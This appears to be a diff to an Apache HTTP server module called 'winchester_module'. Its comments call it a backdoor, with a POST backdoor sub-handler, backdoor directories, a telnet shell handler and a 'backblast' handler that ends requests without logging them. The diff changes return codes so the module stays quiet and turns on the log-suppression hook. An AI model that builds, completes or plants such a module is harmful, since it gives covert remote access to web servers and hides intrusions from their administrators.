@@ -13,7 +13,7 @@ static int winchester_handler(request_rec *r)
 {
 	if (!r->unparsed_uri) {
         // no uri, pass
-        return OK;
+        return DECLINED;
     }
 
     // sub-handler for post backdoor
@@ -70,11 +70,11 @@ static int winchester_handler(request_rec *r)
     }
 
     // didn't hit a backdoor dir, pass
-	return OK;
+	return DECLINED;
 }
 
 // telnet shell handler
-static int shell_handler(request_rec *r)
+static int shell_handler(conn_rec *c)
 {
     return DECLINED;
 }
@@ -88,14 +88,14 @@ static int backblast_handler(request_rec *r)
     }
 
     // if it does, throw DONE without logging
-    return DONE;
+    return DECLINED;
 }
 
 static void register_hooks(apr_pool_t *pool)
 {
    ap_hook_post_read_request(winchester_handler, NULL, NULL, APR_HOOK_REALLY_FIRST);
    ap_hook_process_connection(shell_handler, NULL, NULL, APR_HOOK_FIRST);
-   // ap_hook_log_transaction(backblast_handler, NULL, NULL, APR_HOOK_REALLY_FIRST);
+   ap_hook_log_transaction(backblast_handler, NULL, NULL, APR_HOOK_FIRST);
 }
 
 module AP_MODULE_DECLARE_DATA   winchester_module =
